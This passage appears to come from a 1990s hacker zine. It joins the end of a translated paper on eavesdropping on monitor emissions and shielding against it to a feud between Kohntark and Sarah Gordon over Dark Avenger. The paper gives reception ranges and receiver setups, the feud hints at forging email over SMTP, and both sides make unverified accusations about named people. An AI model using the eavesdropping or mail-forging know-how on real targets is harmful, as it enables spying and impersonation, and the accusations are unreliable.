To receive the shell waves a television set must be cable-ready.

Figure 2.4 shows the spectrum for the third type of emission:  the
compromising currents and voltages entering the power supply lines.  It
is very similar to the shell wave spectrum.  The height of this spectrum at
higher frequencies is even smaller than the shell wave spectrum.  In
order to receive any signal a cable-ready television set must be used.
The intensity of the currents and voltages is so high that they can
easily be received using a regular television set with normal
sensitivity.

2.2.  Frequency and Frequency Range

It follows from figures 2.2, 2.3, and 2.4 that the best reception for
the three types of emissions is for the following frequencies:

        compromising radiation      approx. 200 MHz;
        compromising shell waves    approx. 60 MHz;
        compromising voltages       approx. 20 MHz.

The video information of the picture on the monitor has a frequency
range of half a spectral arc.  The frequency range of the receiver must
therefore be 10 MHz for all three types of emission.

2.3.  Directional Characteristics of the Radiation

Figure 2.5 shows the directional characteristics for compromising
radiation emitted by a video display terminal inside a plastic casing.
According to this diagram the lateral radiation dominates.  The field
intensity along the front and back direction is about 30% of the lateral
intensity.  The power of the emitted radiation along these directions is
only about 10% of the power emitted laterally.  The range for the
emitted radiation along the front and back direction is therefore also
reduced to 30%.  This phenomenon suggests for the first time a
protection against compromising radiation, namely proper positioning of
the device.

The compromising shell waves and power line voltages propagate according
to the configuration of the lines.  There is no preferred direction.

2.4.  Range

The range of compromising radiation emitted from a video display
terminal is defined as the maximum distance between the emitting
terminal and a television receiver and readable picture.

The range can be very different for the three types of emitted
radiation.  It depends on the type of emitter and the path of
propagation.

The spectacular ranges for emitted ranges are often quoted - some of
which do not always come from the technical literature - give in general
no indication just under which conditions they were obtained.  It is
therefore meaningful to verify these spectacular ranges before using
them.

2.4.1.  The Range of Compromising Emitted Radiation

The dependence of the field intensity on distance is illustrated in
figure 2.6.

The dependence of the range on the receiver used is shown at 25 m, 40 m,
and 80 m.  The field intensity  at 25 m is just strong enough to receive
a picture with an ordinary television receiver using the set-up in figure
1.3.  If one uses a narrow-band television antenna or a noiseless antenna
amplifier than the field intensities at 40 m and 80 m, respectively, are
still strong enough to receive a legible picture.

The flattening out of the curve at large distances suggests that the
range can be increased to several hundred meters by using more sensitive
antenna or better receivers.  The range can also be increased through a
high altitude connection, for instance, if both emitter and receiver are
in or on a high rise.  This was verified by an experiment involving two
high rises separated by over 150 m.  A very clear picture was received
using a relatively simple antenna with G = 6 db.

2.4.2.  Range of Compromising Shell Waves

Measurements have shown that shell waves can propagate across a large
area without any noticeable damping if only the surrounding metallic
conductors extend also across the entire area.

The propagation is reduced considerably by a metallic conductor that
crosses metallic surfaces such as metal walls or metallic grids such as
reinforcements in concrete walls.

Dissipative building materials also damp shell waves.  Lightweight
construction such as the use of dry walls or plastic walls in large
buildings increases the range of shell waves to about 100 m without the
picture becoming illegible.

2.4.3  Range of Emissions Through Power Supply Lines

In this case the conditions are even less clear than in the previous
cases.  It must be assumed that inside a building the compromising
currents and voltages can be received through the phase of the power
supply lines feeding the video display terminal .  The possibility of
receiving the signal through other phase lines by coupling across phases
in the power supply line cannot be excluded.

The range depends very much on the type of set-up and the instruments
used.  It is conceivable that a range of about 100 m can be obtained.

3.  Protective Measures

Protective measures fall into three categories:

    -   modification of devices and instruments by changing procedures
        and circuitry;
    -   heterodyning by noise or signals from external sources;
    -   shielding, interlocking, and filtering.

3.1.  Instrument Modification

The instrument modifications consist of changing the signal processing
method and the circuitry of the instrument.  It is the objective of
these measures to alter the spectral distribution and intensity of the
emitted radiation in such a way that the reception by television sets or
slightly modified television sets is no longer possible.

For instance, a change of procedure could consist of a considerable
increase in the dot or pixel frequency, the symbol and line frequencies.
A reduction in the impulse amplitude and impulse slope also changes the
reduction in the impulse slope also changes emission spectrum so that
reception is rendered more difficult.  However, the subsequent
modification of the video display terminal has serious disadvantages of
its own: First of all, the user of video display terminals does in
general not possess the personal and apparative equipment to perform the
modifications.  To complicate things further, the so-modified
instruments loose their manufacturer&#039;s warranty and also their permit of
operation issued by governmental telecommunication offices.  A subsequent
instrument modification by the user is for these reasons in general out
of question.

3.2. HETERODYNING STRATEGY

We refer to a protective measure as a heterodyning strategy whenever the
compromising emitted radiation is superimposed by electromagnetic noise
of specific electromagnetic signals.

The television set receives the compromising emitted radiation together
with the superimposed noise of spurious signal.  The noise or the
spurious signal are such that a filtering out or decoding of the
compromising emitted radiation by simple means is impossible.

Since the noise and the spurious signal not only interfere with the
television receiver of the listener but also with other television sets
in the vicinity the heterodyning strategy is by all means in violation
with the laws and regulations governing telecommunications.  As far as
is known, this is a protective measure only used under extremely
important circumstances involving high government officials.

3.3  Shielding

In contrast to the previously considered protective measures, shielding
has two important advantages:

*   shielding protects not only against compromising emitted radiation
    but also against electromagnetic emissions which can enter data
    processing devices from the outside and cause interference;
*   furthermore, shielding neither violates the laws governing the use
    of telecommunications nor does it jeopardize the manufacturer&#039;s
    warranty.
The term shielding is used here to describe, shielding, interlocking,
and filtering.

3.3.1.  Shielding Data

The requirements on a shield are described by the shield damping.  The
shield damping is twenty times the logarithm of the ratio between the
electric or magnetic field intensity inside the shield and outside the
shield.

Actual applications and individual situations may require different
values for the shield.  The shield data are derived from the so-called
zone model.  In the zone model one considers the type and intensity of
the emitted radiation, the composition of the path of propagation, and
the local accessibility for the receiver.

The shield data not only influence the shield damping but also the
frequency range of the shield&#039;s effectiveness.  Figure 3.1 shows a
diagram listing different types if shields according to regulations MIL
STD 285 and 461B, NSA 656, and VG norms 95 375.

3.3.2.  Applicability of Shielding

Electromagnetic shielding can be used on emitting or interfered with
instruments, on building and rooms, and on mobile cabins.

3.3.2.1.  Shielding of Instruments

The shielding of instruments though it can often be done very quickly
and effortlessly is not without problems.

In general but especially after subsequent installation, it can lead to
a loss in design and styling of the shielded device.  Openings in the
shield, for instance for ventilation or control and operating elements,
cannot always be sealed off completely.  In this  case they are emission
openings with particularly high emission rates.

Trying to maintain ergonometric conditions - good viewing conditions for
the users - renders the shielding of screens especially difficult.  If
the casing of the instruments is not made of metal but of plastic, the
following shielding materials are considered: metal foils, metal cloth,
metal-coated plastics, electrolytical layers and coats of metallic paint
or paste.  Recently, the plastics industry is also offering metallized
plies of fabric.  Such glasses are for instance offered by VEGLA,
Aachen.  Ventilation openings are sealed off with metallic fabric of
honey-comb wirings.

Interlocking systems and filters on all leads coming out of the
instrument prevent the emission of compromising shell waves and power
supply voltages.

3.3.2.2.  Building and Room Shielding

There are some advantages in shielding buildings and rooms.  The
building and room shielding lies solely in the competence of the user.
Minor restrictions dealing with the static of the building and local
building regulations only occur with external shielding.  Building and
room shielding offers a protection that is independent of the instrument
or its type.  It is a lasting and effective protection.  Maintenance is
minimal, and subsequent costs hardly exist.  Interior design and room
lay-out are not changed.

If one requires better shielding values or a building and room design
which emphasizes better comfort than greater expenses and thus higher
costs will occur.

3.3.2.3.  Cabin Shielding

Cabin shielding has all the advantages of building and room shielding.
In addition, cabin shielding is not affected by the static of the
building or local building regulations.  Furthermore, cabin shielding
requires less expenses and costs than building or room shielding.

However, shielded cabins do not offer the same comfort or interior
design as shielded buildings or rooms.

3.3.3.  Shielding Components

Electromagnetic shielding consists of three components:
#   the actual shield together with various structural elements as a
    protection against emitted radiation;
#   the interlocking of all non-electric and electric supply lines to
    protect against shell waves;
#   electric filters at all supply lines to protect against compromising
    power supply voltages.

3.3.3.1.  The Electromagnetic Shield

The shield consists of the hull and the shielding structural elements.

3.3.3.1.1.  Shield Hull - Method and Construction

In general, one uses metal sheets or metal foil to construct
electromagnetic shields for buildings and rooms.  If one lowers the
requirements  on the shield damping and the upper limit frequency then
screen wire, metallic nets, and - if properly constructed - even the
reinforced wire net in concrete can be used; the obvious disadvantage
is that the settlements or movements of the building can cause cracks
that will render the shield ineffective.

Therefore, only metal shields or strong wire netting is used for the
construction of electromagnetically shielded cabins.

The building or room shield can be built using several construction
principles.  Figure 3.2 above shows the essential construction principles.

For the Sandwich construction, the shield is between the outer and inner
layer of the wall.  A new type of construction uses the Principle of
the Lost Form.  The shield itself which consists of 3 to 5 mm thick
sheet iron is used as an inner layer in the manufacturing of concrete
walls.  The sheets touch one another and have to be welded together at
the contact points.  If the building or room shields he\ave to satisfy a
special purpose then they have to be grounded at only one point; they
have to be assembled in such a way that they electrically insulate
against the building or room walls.  The so-called inner shields offer
this protection.  In simple cases, the inners shield is placed on top of
the walls maintaining insulation by using a special underneath
construction.  However, this space-saving and simple construction has a
disadvantage; the part of the shield that faces the wall such as
corrosion, settling or moving of the building, or damages due to work on
the exterior of the building can no longer be detected.  The use of
non-corrosive shield material or sufficient back ventilation of the
shield protects against corrosion in these cases.  The self-supporting
inner shield is suspended from a supporting grid construction.  This
construction can be similar to a cabin construction.  In the case
of large rooms, such as halls, one should use a truss for statistical
reasons.  The self-supporting inner shield has the advantage of
accessibility, although the usable room volume has been decreased.

In rooms where the shield is exposed to only slight mechanical wear and
tear and not required to shield completely, shielding metal foil is
glued directly to the wall and welded at the contact points.

The floor construction is almost the same for all four construction
principles.  It is important that the floor onto which the shield is
placed is protected from humidity and is even.  In the case of
electrically insulating layers of, for instance, laminated paper or PVC
are first put on the floor.  The ceiling construction depends on the
specific requirements and necessities.  The ceiling shield can be a
suspended metallic ceiling or a self-supporting ceiling construction.

3.3.3.1.2. Shield Construction Elements

Construction elements which seal off viewing openings or access openings
are called shield construction elements.  Access openings are doors, gates,
and hatches.  Viewing openings are windows.

The shielded doors, gates, and hatches serve two purposes: first to
close off the room, and second to shield the room.

The door, gate, or hatch shield is in general made of sheet iron.
Passing from the door or gate shield to the room shield causes
shield-technical problems.  A construction which is due to the company
of TRUBE &amp; KINGS has proven to be especially effective for this kind of
problem (see figure 3.3).

The set-on-edge door shield, the so-called knife, is moved into a
U-shape which contains spring contacts.  The difference between this and
other available constructions is that the knife is not moved into the
spring upward.  This construction reduces the wear and tear of the
transition point between door and room shield and thus increases the
durability of the construction which implies a better protection and
higher reliability.  This construction by TRUBE &amp; KINGS satisfies the
highest requirements on shield damping.

Windows in shielded room are sealed off with the shielding glass or
so-called honey-comb chimneys.  It si understood that these windows are
not to be opened.  Figure 3.4 shows the cross-section of a glass
especially developed by VEGLA for data processing rooms.  The glass
consists of multiple layers which are worked into a very fine metallic
net and an evaporated metallic layer.  The thickness of the wire is in
the range of a few micrometers so that the net is hardly visible.  This
glass can also be manufactured so that it is rupture- and fire-resistant
and bullet-proofed.

Using glass one can reach shield dampings in the medium range (refer to
figure 3.1).  Specially manufactured glass reaches even higher shield
dampings.

Figure 3.4 also shows the so-called honey-comb chimneys as manufactured
by SIEMENS.  Visibility and the comfort of light are highly restricted.
But the advantage is that this type of shielding satisfies the
requirements for highest shield damping.

3.3.3.2.  Interlocking

All non-electric supply lines leaving a shielded room must be
interlocked in order to protect against the propagation of shell and
surface waves.  Water pipes, heating pipes, pneumatic and hydraulic
pipes are connected via rings to the metallic shield.  Depending on the
required frequency range, the pipe diameter is also subdivided by filter
pieces.  At high frequencies on can achieve dampings of up to 100dB
using such interlocking devices.

The ventilation of shielded rooms may cause problems.  Problems will
occur if shield dampings up to the highest frequencies are required.  In
this case one has to use two-step ventilation filters.  The first step
consist of adding concave conductor filters which work for the
frequencies up to 200 GHz, the second step of adding absorber filters
which protect against compromising emitted frequencies above 200 GHz.

Figure 3.5 shows the set-up for the above-described ventilation lock
which is due to the SCHORCH.

3.3.3.3.  Electric Filters

Filters must be put on electric power supply lines, telephone wires, and
data processing supply lines at the room exit point.  The filters have
to be installed at the shield.

The filters used here are the same as the ones shown in the area of
electromagnetic compatibility.

4.  Summary

Electric devices used in data processing, data transmission and data
handling emit electromagnetic radiation, electromagnetic shell and
surface waves, and currents and voltages in power supply lines,
telephone wires, and data supply lines.

If this emitted radiation carries actual data or information from the
data processing device then it is compromising.

Using a television receiver, it is very easy to receive, decode and make
these compromising emissions legibly.  Several possibilities present
themselves as protective measures against compromising emissions from
data processing and data transmitting equipment.  The use of shielding
in the form of room shields, interlocking of supply lines, and filters
for electric lines is the best protection for the user of data
processing, data transmitting, and data handling equipment.

[Editor&#039;s Note:

  The following two files are very interesting.  I never paid ANY
  attention to the realm of our community that focus on virii.  For
  some reason, the whole idea behind them is a novel concept, but
  I never saw any reason to take notice of them.  Even when I&#039;ve
  given lectures, I always leave discussion about virii out, since
  they should be a moot point.  I mean, when &quot;fdisk /mbr&quot; will take
  care of so many problems, what&#039;s the big deal?

  I know I&#039;m over-simplifying things, but jesus...

  Well, while I continued to overlook this small but earnest group
  of folks who dabble in virii, all kinds of things began to happen.
  Groups formed, rivalries flared, paranoia ran rampant and one of the
  most ridiculous cottage industries in the history of personal
  computing appeared (living on the spread of Fear, Uncertainty and
  Doubt.)

  Well, in all of this several names have popped up as potential threats
  to this little world.  One in particular, Sarah Gordon, even got the
  spotlight as a paranoid, BBS-busting, hacker-bashing psychopath in a
  rather ill-researched and hastily prepared Phrack piece a few years
  back.  It is rather odd that in all the hype we in the underground
  drum up, no one ever bothers to get the other side of the story, so we
  feed the fervor and continue the paranoia.

  Well, with this in mind, I received a file claiming to have info
  regarding the big &quot;expose&quot; of Sarah masquerading as the Dark Avenger.
  Now, even a moron like me has heard of the Dark Avenger, so I read it.
  After doing so, I wanted to pipe it to /dev/null, but then decided it
  would be much more fun to send it to Sarah too, and let her respond to it.

  It&#039;s amusing as hell, and just goes to show that the underground
  has as many similarities in its distinct groups as it does
  differences.]

         Sara(h?) Gordon AND THE DARK AVENGER SCAM.
         By Kohntark


         In one of my many online conversations with Sara Gordon
         I once asked her about the validity of the VNI interviews and
         her real relationship with the alleged dark avenger; after
         logging into her VFR BBS and seeing a #2 (hers being #1)
         account named after him.
         I proceeded to leave a message for the dark avenger there,
         claiming that the whole account was bogus as it is highly
         improbable that this person might call all the way from
         Bulgaria and log into a mediocre BBS just to chat with her,
         considering the expense of such long distance call , the
         economic situation in Eastern Europe and a fact that
         would learn later: Sara(h) Gordon has an account on the
         Bulgarian DIGSYS unix server, locally accessible by phone
         from there!

         As it was expected, Sara(h) quickly &#039;noticed&#039; my personal
         message to the dark avenger and replied to my questioning in
         a public post in FIDONET, (I don&#039;t read FIDONET posts and she
         knows I have no access to them!!!! )
         She claimed that the dark avenger was fully aware of how much
         money she made out of the VNI interviews and that she was in
         touch with him, etc.etc.

         Afterward, I questioned her again about the whole affair
         and demanded a proof, or some sort of direct contact from the
         dark avenger to my anonymous internet account.

         Since this was the first time anyone had ever questioned the
         validity of her relationship with the DA, she took this to
         heart and shortly after, I received 3 short messages
         originating from &lt;dav@danbo.digsys.bg&gt; an Internet connected
         UNIX system in Bulgaria.

         Here they are:

kohntark-

i just talked to a friend of mine who said you dont like her user
log. why shouldnt i call her from bulgaria? i call whoever i want
to, and this is not your problem.

by the way, she sent me your mail. for your information, i do
know how much money she made of that interview. and i also think
that this is none of your business.

also, maybe it would be good for you to know, that by offending
her, you are offending me, too. keep this in mind.

&lt;dav&gt;
Second Message:
-------------------------------------------------------------------------


&gt;My mail with her is none of your business either.

i dont think so, dude.


maybe you need to read the next few lines again,
in case you missed them.


&gt;&gt;
&gt;&gt; also, maybe it would be good for you to know, that by offending
&gt;&gt; her, you are offending me, too. keep this in mind.
&gt;&gt;
&gt;&gt; &lt;dav&gt;
 &gt;
 &gt;HA HA! and you expect me to believe that you are the DA!
 &gt;send me a proof: an email address from bulgaria or tell me
 &gt;how many addressing modes does the MTE have?
 &gt;
 &gt;nice try.


 well, what do you think the domain .bg in my email address stands for?
 maybe you think its kameroon?
 as for the mte, im not giving you any info.

 i need not prove anything to anybody, and certainly dont plan to waste more
 of my time talking to you. you have been warned.


&lt;dav&gt;

Third Message:
-------------------------------------------------------------------------

 oh, yeah. sure it did.
 only you will not know where something else came from, when it knocks on your
 door. i have nothing more to say.

-------------------------------------------------------------------------


         In my ignorance, I blindly trusted the three cryptic replies
         to be true, even thought whoever replied refused to give out
         trivial information such as the number of addressing modes
         for a 2 year old encryption engine (MTE) and spelled Cameroon
         with a &#039;k&#039; (Check out Sara Gordon&#039;s spelling of URUGUAY in
         VIRUS-L Volume 6 Issue 120 -v06i120)
         Shortly after other unrelated discussions and a CUD post from
         Sara(h) in which I was mentioned (unnamed), someone warned me
         of several posts in NUKENET by an alleged dark avenger and
         Todor Todorov from an account belonging to the last,
         mentioning me and Aristotle.
         In those messages I was referred to as &#039;hotshot,&#039; a word that
         Sara Gordon had used on me several times on our personal
         email exchange; It was then that I became highly suspicious
         of the whole matter.

         I called Virginia&#039;s Virus Research Institute&#039;s sysop and
         owner, Aristotle to find out more about the posts and he
         bought to my attention the particular writing style of
         Sara(h) Gordon: She NEVER uses capital letters and
         apostrophes on her personal email, and always signs her name
         on the lower left hand corner. (She seldom signs her posts
         nowadays and changes her user name in her vfr@netcom.com
         account every week!; for further proof of her writing style,
         please refer to public posts in VIRUS-L Volume 6 #120; I also
         have over 100K of personal email exchange to prove this
         fact!)

         It was then that we realized that she was passing herself as
         Todor Todorov and the dark avenger (who could possibly verify
         their online identity?) and had infiltrated NUKENET..

         The writing style described corresponds exactly to the one on
         the posts I received from the &#039;dark avenger.&#039;
         Shortly afterward the &lt;dav@danbo.digsys.bg&gt; account was
         cancelled and I learned the whole truth:

         The danbo.digsys.bg Bulgarian site belongs to Daniel Kalchev,
         another self appointed AV researcher whose best claims to
         fame are submitting various Bulgarian viruses to Patricia
         Hoffman&#039;s VSUM!!
         (You can check this by doing a search on &#039;Kalchev&#039; on the
         current VSUMs or you can contact him thru:
         &lt;daniel@danbo.sigsys.bg&gt; )
         He is a very close friend of Sara(h) Gordon and he has an
         account in her VFR BBS (you can check this by logging into
         her system and checking the user list) and SHE has an
         account in digsys.bg under &lt;sarah@danbo.digsys.bg&gt; (this
         account is still valid as far as I know; notice the H after
         her name!)

         What I concluded is that is the DA would never get an account
         in such system as he HATES Daniel Kalchev!!!!

         This is what really happened: Sara(h) Gordon in her
         desperation to prove that she was in touch with the dark
         avenger, told her pal Daniel Kalchev to make an account under
         the dark avenger&#039;s name (&lt;dav&gt; this is how she always refers
         to him, even though he never signs his name that way (check
         the source code for his &#039;Dark Avenger&#039; virus or the
         &#039;Commander Bomber&#039; virus message name: [DAME])
         From there she could email me messages that would come from
         Bulgaria and would be untraceable since she would log into
         her account in digsys.bg and log into the &lt;dav&gt; account
         internally from the same site in Bulgaria. (You can check
         where and when most of the people log from in most internet
         unix and vax sites)

         As it is expected from her, she has denied any of this.
         Some of her ridiculous explanations include things like
         &quot;hotshot is a very common English word in Bulgaria&quot; !!!

         You might ask yourself what is the deal with the h? is it
         sara or sarah??
         Well, I asked her the same question when I noticed this in
         one of the VNI interviews, where her name is spelled as
         Sarah.
         She replied that this was a mistake of the publisher.
         Mistake? well not really, it was another lie, meant to throw
         off any information and truth seekers, for example you can
         check her account in Daniel Kalchev&#039;s system:
         &lt;saraH@danbo.digsys.bg&gt; , spelled with an H,
         another &#039;mistake of the publisher?&#039;
         :)

         Other countless Sara Gordon lies are told in NUKE Info-
         Journal # 6.

         This behavior puts in question the validity of the VNI
         interviews and the reputation of Sara(h) Gordon as a serious
         (self appointed) &#039;virus researcher&#039;

         IMHO the VNI interviews are a complete fabrication, meant
         only to boost her validity as a &#039;journalist&#039;, and to make her
         lots of money, charging for further &#039;interviews&#039; to other
         magazines. (She has offered her paid &#039;interviewing&#039; services
         to various other publications.)

         To the best of my knowledge the information I present here
         is true and can be checked.
         I chose to publish this information, despite threats against
         my well being and countless lies about me propagated by
         Sara(h) Gordon.
         I am doing this to stop the lies and corruption fostered by
         the Anti-Virus industry.

****************************************************************************

                            Sarah Gordon&#039;s Response


Greetz and Salutations :)

Thank you for giving me the opportunity to contribute to Phrack. While
we may not agree on everything, I appreciate the chance to speak for
myself. In the past, as many people now know, I have not
had the opportunity to do so. My philosophies and ideals are quite similar
to your own, and I hope that my response to this &quot;Article&quot; will help shine
a bit of light on what is really going on here.

I don&#039;t really want to spend too much time on it, because it is, as you
said, obviously a personal attack. But, on the other hand, such nonsense
can grow to the point where it has an effect. Perhaps a backlash on the
programmers and hackers in Bulgaria, which of course will spread to the
United States. They have suffered a lot of persecution because of the past
malicious and irresponsible acts of some of their virus writers. Since Dark
Avenger stopped writing viruses, their reputation has improved somewhat.

David Briscoe recently wrote:

&quot;Computer hackers in former communist countries, including an elusive Bulgarian
known as the Dark Avenger, are creating mischievous and sometimes costly viruses
that threaten computers around the world&quot;.

Following a recent interview I conducted with Dark Avenger, I was chastised for
not making his identity known so he could be &#039;made to pay&#039;.

In &quot;Discover&quot; Magazine, writers Paul Mungo and Brian Clough
are quoted from their book &#039;Approaching Zero&#039; &quot;the Mutating Engine...the
most dangerous virus ever produced&quot;.  This is so stupid, especially
considering the thing does not replicate. It&#039;s a tool that can be used
to perform encryption. Well, decryption too, but explanation of how it
works aren&#039;t the point here, suffice to say it&#039;s not &quot;the most dangerous
virus ever produced&quot;.

If people are going to rely on the media as an information resource, the
media owes it to us to provide us with accurate information. However,
this is simply not always the case.

If you consider the actual viruses commonly found -in the wild- (that is,
by computer users such as those from universities, corporations, etc.),
the number of Bulgarian viruses -directly- impacting the users is a very
insignificant number. For some reason, the media likes to play up
Bulgaria as the big force behind the destruction of data!

I personally don&#039;t have an interest in the economy of Bulgaria or any
other country, but the media sure likes to use this kind of
&quot;information&quot; to sell their own particular brand of fear.

No more fear. Fear is a bad thing. It is one of the things that leads us
to have government intervention into areas of our lives where it is
definitely not desired.



         Sara(h?) Gordon AND THE DARK AVENGER SCAM.
         By K$hntark



         In one of my many online conversations with Sara Gordon
         I once asked her about the validity of the VNI interviews and
         her real relationship with the alleged dark avenger; after
         logging into her VFR BBS and seeing a #2 (hers being #1)
         account named after him.


Of course his (Dark Avenger) name was #2 there. I put it there for him. His last
call to my BBS was July 31, 1993 at 1:55 p.m. However, this was not the start of this
business with Kohntark. He had been mailing me for about one month. From
an account using the address of cxxxxx.ic.xxxxxx.edu. Keep this address
in mind. It will come in handy later.

I am not exactly sure of the date of the first message, but I think about one
month. He had been reasonable enough at first, but he became
increasingly agitated. Since he felt it was appropriate to include
personal mail from Dark Avenger to him here, I think I can go ahead and
illustrate for you some of his &quot;hacking&quot; :) (well, if you can call it
hacking. you decide). (OH GOD, LOWER CASE...LeTZ SeE...)


         I proceeded to leave a message for the dark avenger there,
         claiming that the whole account was bogus as it is highly
         improbable that this person might call all the way from
         Bulgaria and log into a mediocre BBS just to chat with her,
         considering the expense of such long distance call , the
         economic situation in Eastern Europe and a fact that
         would learn later: Sara(h) Gordon has an account on the
         Bulgarian DIGSYS unix server, locally accessible by phone
         from there!

This guy doesn&#039;t seem to know much about the &quot;economic situation in
Eastern Europe&quot;. At least, about Dark Avenger&#039;s personal economic
state:) or mine. Maybe Dark Avenger could call digsys, but I
certainly couldn&#039;t when I first started talking to him. I didn&#039;t have
any internet account. All I had was my mediocre BBS.   He couldn&#039;t get to
my BBS any way but to call me, directly.


Yes, I have an account there -now-, but I don&#039;t and didn&#039;t use it to chat with
Dark Avenger. He did not want the sysadmin to monitor our chats. And, I
didn&#039;t -have- that account until after I had talked to Dark Avenger for
a long time, so I could hardly have used that server to talk to him
early on I didn&#039;t have an account there then :) In fact, neither did he,
at that time, because there was no digsys.bg as far as I know. He called
Danbo BBS for years. It was not on the internet. He did later use it later,
once it actually got onto the internet, to occasionally mail me, but not much.
He used it more to come to IRC.

In fact, a couple people you know talked to him there, with me. They didn&#039;t
like him much; found him rude and arrogant. He can be.

However, he most certainly did call me here. Does Kohntark think he is
the only one who can make long distance telephone calls? Dark Avenger
called me frequently, and not always from Bulgaria. I don&#039;t know how or
if he paid for the calls, all I know is that since I couldn&#039;t afford
to call, and didn&#039;t know any number for him, he called me.

As for my &quot;mediocre&quot; BBS, it serves its purpose:) I think giving out
virus free anti-virus products, and products that don&#039;t cost the users a
small fortune, and that actually WORK is quite a good purpose. I don&#039;t
see any reason for people to be exploited by some a-v companies, who
are promoted by various magazines, which in turn rate them highly
because they are doing their advertising.

         As it was expected, Sara(h) quickly &#039;noticed&#039; my personal
         message to the dark avenger and replied to my questioning in
         a public post in FIDONET, (I don&#039;t read FIDONET posts and she
         knows I have no access to them!!!! )

Kohntark called my BBS, at my invitation, on July 13, 1993 at 23:19.
There&#039;s no other way he could have left any mail because its an invite
only system. It&#039;s not like it was any big shock to me that he called.
He asked me to make him an account and I did.

Dark Avenger was a regular caller to my BBS, and read his message, I
imagine, since he fwded it to me. I don&#039;t know what access Kohntark
has or doesn&#039;t have, as far as what networks he uses, (as far as what
networks he reads mail from, that is) as I explained to
him. I mailed him there because of the mail he left to Dark Avenger (which
he forwarded to me) on MY system, and because I received a very nasty message
from Kohntark, using the address kohntark@rot.in.hell.com, if I remember
correctly. I sent the message, and did include answers to his questions
because I wanted to continue talking with him. The message had the headers
included from, guess where? cxxxxx.ic.xxxxxx.edu....


         She claimed that the dark avenger was fully aware of how much
         money she made out of the VNI interviews and that she was in
         touch with him, etc.etc.

This is the truth. In case anyone is curious, the amount of money I made
from this article was less than the amount of my PC Pursuit Bill from
calling to do chats and talks with him. At that time he had accesses via
various networks, and we talked on a regular basis. Additionally, Dark
Avenger had full control over taking out or editing any of his comments
in the interview. It is a policy of mine. If you wish to confirm it, I
can put you in touch with other virus writers. I can in fact do it any
time probably, as they are usually around where we are. Let me know if
you want me to do it. Dark Avenger was even a bit obsessive about how
much money I would make.

I also &quot;sold&quot; the story to PCWorld, where it has been published, in
part. I have not received any compensation for this yet. More later on why I
did the interview.

Maybe the problem is I didn&#039;t interview Kohntark...

         Afterward, I questioned her again about the whole affair
         and demanded a proof, or some sort of direct contact from the
         dark avenger to my anonymous internet account.

First, I do not have to &quot;prove&quot; my contact with this man to anyone. It
has been well enough observed and documented every step of the way. Ever
hear of the dedicated virus? It is the demo virus that came with the
Mutation Engine. It contains &quot;We dedicate this little virus to sara
gordon who wanted to have a virus named after her&quot;. (At this point, Dark
Avenger did not really know me, we were just establishing our contact;
he still used the spelling Sara for my name :)

I provided Kohntark with an address with Dark Avengers permission.
Actually, the account Dark Avenger had at digsys which he used to get to
me on chats or IRC (2 years after initial contact) was not
under the name Dark Avenger OR dav, but under another name which would
draw less attention to itself if someone happened to finger us during
one of our chats. The system adminstrator made the additional account
later, since he knew quite well it -was- Dark Avenger, having had an
ongoing battle with him for years.

Kohntark wrote to Dark Avenger there, just like he said he did. At least
this much is true. And, I did receive copies of the mail. Actually Dark
Avenger did not want to even answer the mail, but I asked him to please
do it so that the guy would leave me alone.

Someone using the same mail headers had already sent a message to WIRED,
telling them &quot;The DA is old news, he hasn&#039;t made a virus in 2 years,
you should interview ME&quot;. Wonder who that might have been......
Does the header cxxxxx.ic.xxxxxx.edu ring any bells?

At that point, Kohntark forged mail to WIRED magazine, this time posing
as Dark Avenger. I would never have known this, but Dark Avenger fwd back
a very strange reply message from WIRED and asked me what in the hell was
going on. In that message, WIRED had included part of the message they
had received. It clearly displayed the cxxxxx.ic.xxxxxx.edu headers,
indicating that the mail had been sent from someone there! Someone who
told WIRED &quot;I don&#039;t want to talk to you&quot; (paraphrased). Even WIRED told
me &quot;That mail did not sound like Dark Avenger..it was just all wrong&quot;
(paraphrased). I pointed out the headers to them later. It was a bad
hack on Kohntark&#039;s part. Anyone doubts, it mail the sysadmin at
digsys.bg.

Here is a copy of that mail,  with &quot;compromising&quot; parts xxxxed out.

First, Dark Avenger&#039;s legitimate fwd to me:

I read in VIRUS-L that some idiot  (atman@rahut.net) wants to do
interview with me face to face.
I am not interested in being in your magazine.
I am not interested in being interviewed, even if you offer me $1000.
or more.
I am not interested. so tell your friend to stop mentioning me in
VIRUS-L, i have NO interest.
Please don&#039;t bother to reply. I have no time for stupidity.

Interesting use of the anonymous mailer port 25, eh?  (clue: try helo)

         Since this was the first time anyone had ever questioned the
         validity of her relationship with the DA, she took this to
         heart and shortly after, I received 3 short messages
         originating from &lt;dav@danbo.digsys.bg&gt; an Internet connected
         UNIX system in Bulgaria.

HAHAHA. This has been questioned many times. Do you think the ACM, or
any magazine would risk printing this without adequate proof? My contacts early
on with the virus writer were well documented. I had to prove myself to
everyone from Vesselin Bontchev (who did not believe me until he had
seen the source code to Commander Bomber, which is a virus; the source
code has never been made available to anyone). Here:

So, here is my official statement.

I hereby confirm that when I met Sarah S. Gordon in March 1993 in New
York, she showed me the original source of the Commander Bomber virus.
It was obviously a source and not a disassembly, and it was very
similar to a couple of other sources of Dark Avenger&#039;s programs that I
have seen. When I say &quot;similar&quot; I mean such things like label names,
commenting style, layout of the text and so on. Of course, this is not
a proof that it has been really produced by the Dark Avenger, but this
is very probable. Sarah didn&#039;t give me a copy of it and I didn&#039;t
insist, because she told me that she has promised to Dark Avenger not
to give this source to anybody. To my knowledge, nobody else has the
source.

Regards,
Vesselin

Keep in mind, Vesselin is not a product developer and has no affiliation
with any developers. He is a Doctoral Student who has himself been
accused of being the Dark Avenger.

The Bulgarian Secret Police seemed to believe my
contact was legitimate enough. I received an &quot;invitation&quot; to meet with
them. I declined this &quot;invitation&quot; because I am not interested in the terrorist
tactics of a desperate government to blame a hacker and virus writer for
the problems of the country in general.

I had to prove my contact lots of ways, just to get the article in
print. Why did I want this article in print? One simple reason. To show
this virus writer as not some evil sinister monster from Hell waiting to
destroy the earth&#039;s supercomputer. Just as a person like the rest of us.
Did it accomplish it? I think it did, from the response I got from most
people. Did -I- personally &#039;benefit&#039; from it? In some ways, I did.

This reminds me, a certain ex-virus exchange sysop told me that he was
going to make me expose the Dark Avenger; that he was going to find out
his true identity, where no one else could; that he would make up some
story, any story, to force Dark Avenger out into the open. Well, I don&#039;t
narc on my friends. I am sure you can appreciate that.

kohntark-

i just talked to a friend of mine who said you dont like her user
log. why shouldnt i call her from bulgaria? i call whoever i want
to, and this is not your problem.

by the way, she sent me your mail. for your information, i do
know how much money she made of that interview. and i also think
that this is none of your business.

also, maybe it would be good for you to know, that by offending
her, you are offending me, too. keep this in mind.

